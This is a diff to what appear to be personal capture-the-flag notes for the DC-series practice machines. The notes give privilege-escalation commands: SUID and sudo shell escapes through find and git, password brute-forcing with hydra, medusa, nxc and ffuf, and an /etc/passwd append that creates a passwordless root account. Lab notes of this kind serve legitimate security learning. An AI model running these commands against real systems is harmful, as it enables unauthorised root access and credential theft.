@@ -21,6 +21,8 @@ Awesome script for SUID Exploitation ====> suid3num.py <=====
 find / -type f -perm -4000 2>/dev/null   ---> find
 
 find . -exec /bin/sh -p \; -quit
+
+# bling bling !!!
 ```
 
 # dc-2
@@ -50,6 +52,8 @@ Password Reuse and [sudo -l] :-
 sudo git help add
 # Type this
 !/bin/bash   #Enter it!
+
+# bling bling !!!
 ```
 
 # dc-3
@@ -69,9 +73,31 @@ nuclei -u $URL -t /root/nuclei-templates/http/cves/ -tags joomla
 - searchsploit 
 - msfconsole  <-- A lot!
 
+### Post Exploitation
 # Linux kernal Exploitation
 ------> linux kernal exploitation <-------
 => uname -a
 => file /bin/bash
 => cat /etc/*-release
+
+# bling bling !!!
+```
+
+# dc-4
+```bash
+- Brute force login pages   --> ffuf , burp , caido 
+               * ffuf -request req.txt -request-proto http -w /usr/share/wordlists/rockyou.txt -fs 206
+- password brute force with --> medusa, hydra, nxc
+               * hydra -l jim -P old_password.bak dc4 ssh
+               * medusa -u jim -P old_password.bak -h dc4 -M ssh
+               * nxc ssh dc4 -u 'jim' -p 'old_password.bak'
+- Reading mails 
+### Post Exploitation
+[/usr/bin/teehee] sudo -l
+
+echo "0xmr::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
+su 0xmr
+
+
+# bling bling !!!
 ```
